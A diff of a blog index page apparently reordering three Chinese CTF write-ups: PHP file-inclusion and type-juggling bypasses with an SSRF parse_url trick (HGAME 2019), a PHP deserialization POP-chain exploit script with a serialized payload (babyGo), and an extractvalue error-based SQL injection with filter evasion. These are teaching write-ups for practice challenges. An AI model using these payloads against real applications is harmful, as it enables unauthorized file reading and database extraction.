@@ -343,19 +343,19 @@ password:334cfb59c9d74849801d5acdcfdaadc3
 
 
   
-    <article id="post-HGAME 2019 WEB week2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-babyGo" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/29/HGAME 2019 WEB week2/">HGAME 2019 WEB week2</a>
+      <a class="article-title" href="/2019/03/29/babyGo/">babyGo(安恒2019.1 pop链的构造)</a>
     </h1>
   
 
         
-        <a href="/2019/03/29/HGAME 2019 WEB week2/" class="archive-article-date">
+        <a href="/2019/03/29/babyGo/" class="archive-article-date">
   	<time datetime="2019-03-29T13:45:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-29</time>
 </a>
         
@@ -363,9 +363,10 @@ password:334cfb59c9d74849801d5acdcfdaadc3
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="1-easy-php"><a href="#1-easy-php" class="headerlink" title="1.easy_php"></a>1.easy_php</h2><p><img src="/2019/03/29/HGAME 2019 WEB week2/1.png" alt="在这里插入图片描述">题目的标题给出了提示，查看<code>robots.txt</code>。<br><img src="/2019/03/29/HGAME 2019 WEB week2/2.png" alt="在这里插入图片描述"><br>再查看<code>http://118.24.25.25:9999/easyphp/img/index.php</code>，得到源码。<br><img src="/2019/03/29/HGAME 2019 WEB week2/3.png" alt="在这里插入图片描述"><br>由题目可知<code>$img = $_GET[&#39;img&#39;]</code>，我们需要传入一个名为img的变量，其中<code>$img = str_replace(&#39;../&#39;, &#39;&#39;, $img)</code>，会将<code>$img</code>中的<code>../</code>替换为空，这种替换方式可以用双写<code>../</code>即<code>....//</code>进行绕过。接着<code>include_once($img.&quot;.php&quot;)</code>为我们解决问题提供了思路，我们可以利用文件包含漏洞进行任意文件读取。payolad:<code>http://118.24.25.25:9999/easyphp/img/index.php?img=php://filter/read=convert.base64-encode/resource=....//flag</code>。</p>
-<h2 id="2-php-trick"><a href="#2-php-trick" class="headerlink" title="2.php trick"></a>2.php trick</h2><p>这道题结合了多种php函数的漏洞，由浅入深，学到了不少东西。<br><img src="/2019/03/29/HGAME 2019 WEB week2/4.png" alt="在这里插入图片描述"><br> 1.step1和step2要求str1不能等于str2但是md5值要相等，我们注意到<code>md5($str1) != md5($str2)</code>中用到的是<code>!=</code>我们可以找两个md5值开头两位是<code>0e</code>的字符串，利用科学记数法即可进行绕过。<br> 2.step3和step4的要求和上面的类似，但是判断md5值时用到的是<code>!==</code>我们可以传入两个值不相同的数组进行绕过。<br> 3.step5中的<code>strpos($_SERVER[&#39;QUERY_STRING&#39;], &quot;H_game&quot;) !==false</code>要求我们的url中不能存在<code>H_game</code>但我们的str5获取的变量名就是<code>H_game</code>，百度到了一个php的小特性。<br> <img src="/2019/03/29/HGAME 2019 WEB week2/5.png" alt="在这里插入图片描述"><br> 因此我们只需要修改<code>H_game</code>为<code>H.game即可进行绕过</code>。<br> step6：<code>is_numeric($str5)</code>要求str5不能为数字，可以利用传入数组进行绕过。<br> step7：<code>$str5&lt;9999999999</code>要求str5大于9999999999,我们直接传入一个以科学计数法表示的数9e9即可。<br> step8: <code>(string)$str5&gt;0</code>将str5字符串化后的值不能大于0，此时我们的str5已经是一个数组了,<code>(string)$str5</code>的返回值为Array，已经满足了条件。<br> step9和step10考察了php中parse_url()函数的作用解析url并返回其组成部分，这是我在网上找到的例子。<br> <img src="/2019/03/29/HGAME 2019 WEB week2/6.png" alt="在这里插入图片描述"><br>但是我们的目标是访问admin.php。要利用parse_url和curl对域名的解析差异，构造<code>http://@118.24.3.214@www.baidu.com/admin.php</code>即可满足需求<br><img src="/2019/03/29/HGAME 2019 WEB week2/7.png" alt="在这里插入图片描述"><br>得到提示<br><img src="/2019/03/29/HGAME 2019 WEB week2/8.png" alt="在这里插入图片描述"><br>将url修改为http:<a href="mailto://@127.0.0.1" target="_blank" rel="noopener">//@127.0.0.1</a>:<a href="mailto:80@www.baidu.com" target="_blank" rel="noopener">80@www.baidu.com</a>/admin.php得到源码<br><img src="/2019/03/29/HGAME 2019 WEB week2/9.png" alt="在这里插入图片描述"><br>看到<code>file_get_contents($filename)</code>，文件包含漏洞进行对flag.php的读取<code>url=http://@127.0.0.1:80@www.baidu.com/admin.php/?filename=php://filter/read=convert.base64-encode/resource=flag.php</code><br><img src="/2019/03/29/HGAME 2019 WEB week2/10.png" alt="在这里插入图片描述"></p>
-<h2 id="3-PHP-Is-The-Best-Language"><a href="#3-PHP-Is-The-Best-Language" class="headerlink" title="3.PHP Is The Best Language"></a>3.PHP Is The Best Language</h2><p><img src="/2019/03/29/HGAME 2019 WEB week2/11.png" alt="在这里插入图片描述">首先以post方式设置变量<code>$door</code>，<code>$door</code>作为明文，<code>$secret</code>作为密钥重新对<code>$secert</code>进行赋值。但是我们并不知道<code>$secret</code>的具体数值。<br><img src="/2019/03/29/HGAME 2019 WEB week2/12.png" alt="在这里插入图片描述"><br>接着<code>$gate</code>也被明文为以post方式传入的<code>$key</code>，密钥为上文修改的<code>$secret</code>重新赋值，同样的我们还是不知道密钥的值具体是多少。因此<code>$gate</code>的值也不知道具体是多少。<br><img src="/2019/03/29/HGAME 2019 WEB week2/13.png" alt="在这里插入图片描述"><br>但是我们传入的变量<code>$gate</code>需要和加密过的<code>$gate</code>的值相同。这个时候我们就需要利用hash_mac函数的一个漏洞，就是如果传入的明文为数组的时候，返回的值为NULL。也就是说我们传入的<code>$door</code>变量如果是一个数组，那么<code>$secret</code>变量的值也就被修改为了已知的NULL。<br>在当时做这道题时，接下来的if语句没能成功地进行绕过<br><img src="/2019/03/29/HGAME 2019 WEB week2/14.png" alt="在这里插入图片描述"><br>在看完官方的wp之后才知道，存在一次md5加密后值开头为0e再次加密后md5值开头依旧是0e的的字符串(如7r4lGXCH2Ksu2JNT3BYM)，这样就可以利用php弱类型相等进行绕过了，最后的payload为<br><img src="/2019/03/29/HGAME 2019 WEB week2/15.png" alt="在这里插入图片描述"><br><img src="/2019/03/29/HGAME 2019 WEB week2/16.png" alt="在这里插入图片描述"></p>
+        <p>周周练的时候看了一叶飘零师傅的博客才知道pop链的存在(还是太菜了啊)，先来学习一下关于pop链的知识。<br><img src="/2019/03/29/babyGo/1.png" alt="在这里插入图片描述"><br>再看一看这道题目的baby类<br><img src="/2019/03/29/babyGo/2.png" alt="在这里插入图片描述"><br>也就是说这道题目中的类baby调用了sec类的read()方法。<br><img src="/2019/03/29/babyGo/3.png" alt="在这里插入图片描述"><br>但是sec类的read()是一个安全函数，这时候发现cool类也存在一个read()方法，我们可以利用cool类的read()函数对flag.php进行读取。<br><img src="/2019/03/29/babyGo/4.png" alt="在这里插入图片描述"><br>这个时候就要利用最开始提到的pop链来调用cool类的read方法。构造的方法如下(将构造函数中的sec改为cool即可)<br><img src="/2019/03/29/babyGo/5.png" alt="在这里插入图片描述"></p>
+<p>注意到cool类中read方法的判断语句<code>$this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb</code>，而且<code>$this-&gt;nice-&gt;aaa = $sth;</code>变量aaa被一个未知量<code>$sth</code>赋值了。这个时候我们利用指针<code>$a-&gt;bbb =&amp;$a-&gt;aaa;</code>这样bbb的值就能随着aaa的变化而变化，在线编译一下(其中amazing是一个序列化的空的baby类的对象)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class baby </span><br><span class="line">&#123;   </span><br><span class="line">    protected $skyobj;  </span><br><span class="line">    public $aaa;</span><br><span class="line">    public $bbb;</span><br><span class="line">    function __construct() </span><br><span class="line">    &#123;      </span><br><span class="line">        $this-&gt;skyobj = new cool;</span><br><span class="line">    &#125;  </span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;          </span><br><span class="line">        if (isset($this-&gt;skyobj))  </span><br><span class="line">            return $this-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">class cool </span><br><span class="line">&#123;    </span><br><span class="line">    public $filename=&apos;flag.php&apos;;     </span><br><span class="line">    public $nice;</span><br><span class="line">    public $amzing=&apos;O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D&apos;; </span><br><span class="line">    function read()      </span><br><span class="line">    &#123;   </span><br><span class="line">        $this-&gt;nice = unserialize($this-&gt;amzing);</span><br><span class="line">        $this-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;        </span><br><span class="line">            if (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                return file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            else </span><br><span class="line">            &#123; </span><br><span class="line">                return &quot;you must be joking!&quot;; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">class sec </span><br><span class="line">&#123;  </span><br><span class="line">    function read()     </span><br><span class="line">    &#123;          </span><br><span class="line">        return &quot;it&apos;s so sec~~&quot;;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a = new baby();</span><br><span class="line">$a-&gt;bbb =&amp;$a-&gt;aaa; </span><br><span class="line">$b=serialize($a);</span><br><span class="line">echo urlencode($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>get方式传入结果，得到flag</p>
 
       
 
@@ -379,7 +380,7 @@ password:334cfb59c9d74849801d5acdcfdaadc3
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">php</a>
         		</li>
       		
 		</ul>
@@ -389,7 +390,7 @@ password:334cfb59c9d74849801d5acdcfdaadc3
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/03/29/HGAME 2019 WEB week2/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/03/29/babyGo/">展开全文 >></a>
         </p>
       
 
@@ -501,19 +502,19 @@ password:334cfb59c9d74849801d5acdcfdaadc3
 
 
   
-    <article id="post-加了料的报错注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-HGAME 2019 WEB week2" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/29/加了料的报错注入/">加了料的报错注入(实验吧)</a>
+      <a class="article-title" href="/2019/03/29/HGAME 2019 WEB week2/">HGAME 2019 WEB week2</a>
     </h1>
   
 
         
-        <a href="/2019/03/29/加了料的报错注入/" class="archive-article-date">
+        <a href="/2019/03/29/HGAME 2019 WEB week2/" class="archive-article-date">
   	<time datetime="2019-03-29T13:45:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-29</time>
 </a>
         
@@ -521,7 +522,9 @@ password:334cfb59c9d74849801d5acdcfdaadc3
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>题目直接告诉了我们注入点存在于我们post进去的两个变量，即username和password当中，f12查看源码后得到提示，sql语句是以单引号的方式进行闭合的后进行注入测试。<br>首先对username进行注入，经过初步测试对“=”进行了过滤，采用“&lt;&gt;”进行绕过。<br><img src="/2019/03/29/加了料的报错注入/1.png" alt="在这里插入图片描述">显示虽然waf被绕过Username中依旧存在问题，将注入语句修改到password当中。<br><img src="/2019/03/29/加了料的报错注入/2.png" alt="在这里插入图片描述"><br>显示password error，也就是说我们的username和password都存在着不符合题目要求的地方，我们将报错函数extractvalue分别放在username和admin当中。<br><img src="/2019/03/29/加了料的报错注入/3.png" alt="在这里插入图片描述"><br><img src="/2019/03/29/加了料的报错注入/4.png" alt="在这里插入图片描述"><br>我们可以总结出来extractvalue()只能存在于username当中，同理我们还发现了”()”只能存在于password当中<br><img src="/2019/03/29/加了料的报错注入/5.png" alt="在这里插入图片描述"><br><img src="/2019/03/29/加了料的报错注入/6.png" alt="在这里插入图片描述"><br>现在存在于我们身上的问题就是如何实现一句注入语句如何通过两个变量生效。但我们根据题目提示的注入语句，我们可以发现sql=”select  from users where username=’username’ and password=’password’，如果我们使用/*这个代表空格的符号对注入语句进行改造。payload:<img src="/2019/03/29/加了料的报错注入/7.png" alt="在这里插入图片描述"><br>其实此时执行的语句为username=1’or extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e)),”//“中间的内容被注释掉了。<br>对语句改造并查询后<img src="/2019/03/29/加了料的报错注入/8.png" alt="在这里插入图片描述"><br>并没有得到我们想要的结果，在询问了班上的同学之后才知道问题存在于我的“&lt;&gt;”当中，它并不能取代”=”的作用。<br><img src="/2019/03/29/加了料的报错注入/9.png" alt="在这里插入图片描述"><br>因此我们还是采用”regexp”的方式对等于号进行绕过<br><img src="/2019/03/29/加了料的报错注入/10.png" alt="在这里插入图片描述"><br><img src="/2019/03/29/加了料的报错注入/11.png" alt="在这里插入图片描述"></p>
+        <h2 id="1-easy-php"><a href="#1-easy-php" class="headerlink" title="1.easy_php"></a>1.easy_php</h2><p><img src="/2019/03/29/HGAME 2019 WEB week2/1.png" alt="在这里插入图片描述">题目的标题给出了提示，查看<code>robots.txt</code>。<br><img src="/2019/03/29/HGAME 2019 WEB week2/2.png" alt="在这里插入图片描述"><br>再查看<code>http://118.24.25.25:9999/easyphp/img/index.php</code>，得到源码。<br><img src="/2019/03/29/HGAME 2019 WEB week2/3.png" alt="在这里插入图片描述"><br>由题目可知<code>$img = $_GET[&#39;img&#39;]</code>，我们需要传入一个名为img的变量，其中<code>$img = str_replace(&#39;../&#39;, &#39;&#39;, $img)</code>，会将<code>$img</code>中的<code>../</code>替换为空，这种替换方式可以用双写<code>../</code>即<code>....//</code>进行绕过。接着<code>include_once($img.&quot;.php&quot;)</code>为我们解决问题提供了思路，我们可以利用文件包含漏洞进行任意文件读取。payolad:<code>http://118.24.25.25:9999/easyphp/img/index.php?img=php://filter/read=convert.base64-encode/resource=....//flag</code>。</p>
+<h2 id="2-php-trick"><a href="#2-php-trick" class="headerlink" title="2.php trick"></a>2.php trick</h2><p>这道题结合了多种php函数的漏洞，由浅入深，学到了不少东西。<br><img src="/2019/03/29/HGAME 2019 WEB week2/4.png" alt="在这里插入图片描述"><br> 1.step1和step2要求str1不能等于str2但是md5值要相等，我们注意到<code>md5($str1) != md5($str2)</code>中用到的是<code>!=</code>我们可以找两个md5值开头两位是<code>0e</code>的字符串，利用科学记数法即可进行绕过。<br> 2.step3和step4的要求和上面的类似，但是判断md5值时用到的是<code>!==</code>我们可以传入两个值不相同的数组进行绕过。<br> 3.step5中的<code>strpos($_SERVER[&#39;QUERY_STRING&#39;], &quot;H_game&quot;) !==false</code>要求我们的url中不能存在<code>H_game</code>但我们的str5获取的变量名就是<code>H_game</code>，百度到了一个php的小特性。<br> <img src="/2019/03/29/HGAME 2019 WEB week2/5.png" alt="在这里插入图片描述"><br> 因此我们只需要修改<code>H_game</code>为<code>H.game即可进行绕过</code>。<br> step6：<code>is_numeric($str5)</code>要求str5不能为数字，可以利用传入数组进行绕过。<br> step7：<code>$str5&lt;9999999999</code>要求str5大于9999999999,我们直接传入一个以科学计数法表示的数9e9即可。<br> step8: <code>(string)$str5&gt;0</code>将str5字符串化后的值不能大于0，此时我们的str5已经是一个数组了,<code>(string)$str5</code>的返回值为Array，已经满足了条件。<br> step9和step10考察了php中parse_url()函数的作用解析url并返回其组成部分，这是我在网上找到的例子。<br> <img src="/2019/03/29/HGAME 2019 WEB week2/6.png" alt="在这里插入图片描述"><br>但是我们的目标是访问admin.php。要利用parse_url和curl对域名的解析差异，构造<code>http://@118.24.3.214@www.baidu.com/admin.php</code>即可满足需求<br><img src="/2019/03/29/HGAME 2019 WEB week2/7.png" alt="在这里插入图片描述"><br>得到提示<br><img src="/2019/03/29/HGAME 2019 WEB week2/8.png" alt="在这里插入图片描述"><br>将url修改为http:<a href="mailto://@127.0.0.1" target="_blank" rel="noopener">//@127.0.0.1</a>:<a href="mailto:80@www.baidu.com" target="_blank" rel="noopener">80@www.baidu.com</a>/admin.php得到源码<br><img src="/2019/03/29/HGAME 2019 WEB week2/9.png" alt="在这里插入图片描述"><br>看到<code>file_get_contents($filename)</code>，文件包含漏洞进行对flag.php的读取<code>url=http://@127.0.0.1:80@www.baidu.com/admin.php/?filename=php://filter/read=convert.base64-encode/resource=flag.php</code><br><img src="/2019/03/29/HGAME 2019 WEB week2/10.png" alt="在这里插入图片描述"></p>
+<h2 id="3-PHP-Is-The-Best-Language"><a href="#3-PHP-Is-The-Best-Language" class="headerlink" title="3.PHP Is The Best Language"></a>3.PHP Is The Best Language</h2><p><img src="/2019/03/29/HGAME 2019 WEB week2/11.png" alt="在这里插入图片描述">首先以post方式设置变量<code>$door</code>，<code>$door</code>作为明文，<code>$secret</code>作为密钥重新对<code>$secert</code>进行赋值。但是我们并不知道<code>$secret</code>的具体数值。<br><img src="/2019/03/29/HGAME 2019 WEB week2/12.png" alt="在这里插入图片描述"><br>接着<code>$gate</code>也被明文为以post方式传入的<code>$key</code>，密钥为上文修改的<code>$secret</code>重新赋值，同样的我们还是不知道密钥的值具体是多少。因此<code>$gate</code>的值也不知道具体是多少。<br><img src="/2019/03/29/HGAME 2019 WEB week2/13.png" alt="在这里插入图片描述"><br>但是我们传入的变量<code>$gate</code>需要和加密过的<code>$gate</code>的值相同。这个时候我们就需要利用hash_mac函数的一个漏洞，就是如果传入的明文为数组的时候，返回的值为NULL。也就是说我们传入的<code>$door</code>变量如果是一个数组，那么<code>$secret</code>变量的值也就被修改为了已知的NULL。<br>在当时做这道题时，接下来的if语句没能成功地进行绕过<br><img src="/2019/03/29/HGAME 2019 WEB week2/14.png" alt="在这里插入图片描述"><br>在看完官方的wp之后才知道，存在一次md5加密后值开头为0e再次加密后md5值开头依旧是0e的的字符串(如7r4lGXCH2Ksu2JNT3BYM)，这样就可以利用php弱类型相等进行绕过了，最后的payload为<br><img src="/2019/03/29/HGAME 2019 WEB week2/15.png" alt="在这里插入图片描述"><br><img src="/2019/03/29/HGAME 2019 WEB week2/16.png" alt="在这里插入图片描述"></p>
 
       
 
@@ -535,7 +538,7 @@ password:334cfb59c9d74849801d5acdcfdaadc3
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">sql</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">ctf</a>
         		</li>
       		
 		</ul>
@@ -545,7 +548,7 @@ password:334cfb59c9d74849801d5acdcfdaadc3
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/03/29/加了料的报错注入/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/03/29/HGAME 2019 WEB week2/">展开全文 >></a>
         </p>
       
 
@@ -649,19 +652,19 @@ password:334cfb59c9d74849801d5acdcfdaadc3
 
 
   
-    <article id="post-babyGo" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-加了料的报错注入" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/03/29/babyGo/">babyGo(安恒2019.1 pop链的构造)</a>
+      <a class="article-title" href="/2019/03/29/加了料的报错注入/">加了料的报错注入(实验吧)</a>
     </h1>
   
 
         
-        <a href="/2019/03/29/babyGo/" class="archive-article-date">
+        <a href="/2019/03/29/加了料的报错注入/" class="archive-article-date">
   	<time datetime="2019-03-29T13:45:29.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-03-29</time>
 </a>
         
@@ -669,10 +672,7 @@ password:334cfb59c9d74849801d5acdcfdaadc3
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>周周练的时候看了一叶飘零师傅的博客才知道pop链的存在(还是太菜了啊)，先来学习一下关于pop链的知识。<br><img src="/2019/03/29/babyGo/1.png" alt="在这里插入图片描述"><br>再看一看这道题目的baby类<br><img src="/2019/03/29/babyGo/2.png" alt="在这里插入图片描述"><br>也就是说这道题目中的类baby调用了sec类的read()方法。<br><img src="/2019/03/29/babyGo/3.png" alt="在这里插入图片描述"><br>但是sec类的read()是一个安全函数，这时候发现cool类也存在一个read()方法，我们可以利用cool类的read()函数对flag.php进行读取。<br><img src="/2019/03/29/babyGo/4.png" alt="在这里插入图片描述"><br>这个时候就要利用最开始提到的pop链来调用cool类的read方法。构造的方法如下(将构造函数中的sec改为cool即可)<br><img src="/2019/03/29/babyGo/5.png" alt="在这里插入图片描述"></p>
-<p>注意到cool类中read方法的判断语句<code>$this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb</code>，而且<code>$this-&gt;nice-&gt;aaa = $sth;</code>变量aaa被一个未知量<code>$sth</code>赋值了。这个时候我们利用指针<code>$a-&gt;bbb =&amp;$a-&gt;aaa;</code>这样bbb的值就能随着aaa的变化而变化，在线编译一下(其中amazing是一个序列化的空的baby类的对象)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class baby </span><br><span class="line">&#123;   </span><br><span class="line">    protected $skyobj;  </span><br><span class="line">    public $aaa;</span><br><span class="line">    public $bbb;</span><br><span class="line">    function __construct() </span><br><span class="line">    &#123;      </span><br><span class="line">        $this-&gt;skyobj = new cool;</span><br><span class="line">    &#125;  </span><br><span class="line">    function __toString()      </span><br><span class="line">    &#123;          </span><br><span class="line">        if (isset($this-&gt;skyobj))  </span><br><span class="line">            return $this-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">class cool </span><br><span class="line">&#123;    </span><br><span class="line">    public $filename=&apos;flag.php&apos;;     </span><br><span class="line">    public $nice;</span><br><span class="line">    public $amzing=&apos;O%3A4%3A%22baby%22%3A3%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A4%3A%22cool%22%3A3%3A%7Bs%3A8%3A%22filename%22%3BN%3Bs%3A4%3A%22nice%22%3BN%3Bs%3A6%3A%22amzing%22%3BN%3B%7Ds%3A3%3A%22aaa%22%3BN%3Bs%3A3%3A%22bbb%22%3BR%3A6%3B%7D&apos;; </span><br><span class="line">    function read()      </span><br><span class="line">    &#123;   </span><br><span class="line">        $this-&gt;nice = unserialize($this-&gt;amzing);</span><br><span class="line">        $this-&gt;nice-&gt;aaa = $sth;</span><br><span class="line">        if($this-&gt;nice-&gt;aaa === $this-&gt;nice-&gt;bbb)</span><br><span class="line">        &#123;</span><br><span class="line">            $file = &quot;./&#123;$this-&gt;filename&#125;&quot;;        </span><br><span class="line">            if (file_get_contents($file))         </span><br><span class="line">            &#123;              </span><br><span class="line">                return file_get_contents($file); </span><br><span class="line">            &#125;  </span><br><span class="line">            else </span><br><span class="line">            &#123; </span><br><span class="line">                return &quot;you must be joking!&quot;; </span><br><span class="line">            &#125;    </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">class sec </span><br><span class="line">&#123;  </span><br><span class="line">    function read()     </span><br><span class="line">    &#123;          </span><br><span class="line">        return &quot;it&apos;s so sec~~&quot;;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a = new baby();</span><br><span class="line">$a-&gt;bbb =&amp;$a-&gt;aaa; </span><br><span class="line">$b=serialize($a);</span><br><span class="line">echo urlencode($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>get方式传入结果，得到flag</p>
+        <p>题目直接告诉了我们注入点存在于我们post进去的两个变量，即username和password当中，f12查看源码后得到提示，sql语句是以单引号的方式进行闭合的后进行注入测试。<br>首先对username进行注入，经过初步测试对“=”进行了过滤，采用“&lt;&gt;”进行绕过。<br><img src="/2019/03/29/加了料的报错注入/1.png" alt="在这里插入图片描述">显示虽然waf被绕过Username中依旧存在问题，将注入语句修改到password当中。<br><img src="/2019/03/29/加了料的报错注入/2.png" alt="在这里插入图片描述"><br>显示password error，也就是说我们的username和password都存在着不符合题目要求的地方，我们将报错函数extractvalue分别放在username和admin当中。<br><img src="/2019/03/29/加了料的报错注入/3.png" alt="在这里插入图片描述"><br><img src="/2019/03/29/加了料的报错注入/4.png" alt="在这里插入图片描述"><br>我们可以总结出来extractvalue()只能存在于username当中，同理我们还发现了”()”只能存在于password当中<br><img src="/2019/03/29/加了料的报错注入/5.png" alt="在这里插入图片描述"><br><img src="/2019/03/29/加了料的报错注入/6.png" alt="在这里插入图片描述"><br>现在存在于我们身上的问题就是如何实现一句注入语句如何通过两个变量生效。但我们根据题目提示的注入语句，我们可以发现sql=”select  from users where username=’username’ and password=’password’，如果我们使用/*这个代表空格的符号对注入语句进行改造。payload:<img src="/2019/03/29/加了料的报错注入/7.png" alt="在这里插入图片描述"><br>其实此时执行的语句为username=1’or extractvalue(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e)),”//“中间的内容被注释掉了。<br>对语句改造并查询后<img src="/2019/03/29/加了料的报错注入/8.png" alt="在这里插入图片描述"><br>并没有得到我们想要的结果，在询问了班上的同学之后才知道问题存在于我的“&lt;&gt;”当中，它并不能取代”=”的作用。<br><img src="/2019/03/29/加了料的报错注入/9.png" alt="在这里插入图片描述"><br>因此我们还是采用”regexp”的方式对等于号进行绕过<br><img src="/2019/03/29/加了料的报错注入/10.png" alt="在这里插入图片描述"><br><img src="/2019/03/29/加了料的报错注入/11.png" alt="在这里插入图片描述"></p>
 
       
 
@@ -686,7 +686,7 @@ password:334cfb59c9d74849801d5acdcfdaadc3
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">php</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">sql</a>
         		</li>
       		
 		</ul>
@@ -696,7 +696,7 @@ password:334cfb59c9d74849801d5acdcfdaadc3
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/03/29/babyGo/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/03/29/加了料的报错注入/">展开全文 >></a>
         </p>
       
 
@@ -823,15 +823,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">php</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">ctf</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">sql</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">php</a>
               </li>
             
             <div class="clearfix"></div>
